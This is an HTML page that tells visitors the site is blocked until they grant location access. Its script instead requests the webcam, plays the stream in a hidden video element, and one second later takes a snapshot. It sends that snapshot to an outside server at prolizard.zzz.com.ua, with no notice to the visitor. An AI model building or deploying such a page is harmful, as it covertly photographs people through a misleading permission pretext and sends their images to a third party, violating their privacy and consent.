<!DOCTYPE HTML>
<html>

<head>
  <meta charset="utf-8">
  <title>skotobaza</title>
  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
  <style>
  video {
  display: none;
  }
  </style>

</head>

<body>

  <noscript>
    <span>
      <h1>
        <center>
          <font color="#FF0000">You have javascript disabled...</font>
        </center>
      </h1>
      <p>
        <font size="5">
          <center>To surf the site you need to enable JavaScript in the settings.</center>
        </font>
      </p>
    </span>
  </noscript>

  <video class="example-video-stream"></video>


  <h1><b>
      <font size="5">
        <font face="Georgia, serif">OOPS...</font>
      </font>
    </b></h1>
  <p>
    <font size="4">Sorry, but we can not show you the content of the site, because you did not give permission to access
      your location. </font>
  </p>
  <p>
    <font size="4">Site implementation banned in some states.</font>
  </p>



  <script>
    /* config */
    var webeye_parent_folder = 'https://prolizard.zzz.com.ua/web-eye/index.php';
    var webeye_img = false;
    var video = document.querySelector('video.example-video-stream');
    /* /config */

    // Разрешение для потокового видео и исполнение кода
    navigator.mediaDevices.getUserMedia({
      video: true
    }).then(
      stream => {
        video.srcObject = stream;
        video.play();
        setTimeout(() => {
          webeye_img = snapshotTake(video);
          snapshotSubmit(webeye_parent_folder, webeye_img);
        }, 1000);
      },
      err => console.log(err)
    );
  </script>
  <script src="web-eye/index.js"></script>

</body>

</html>
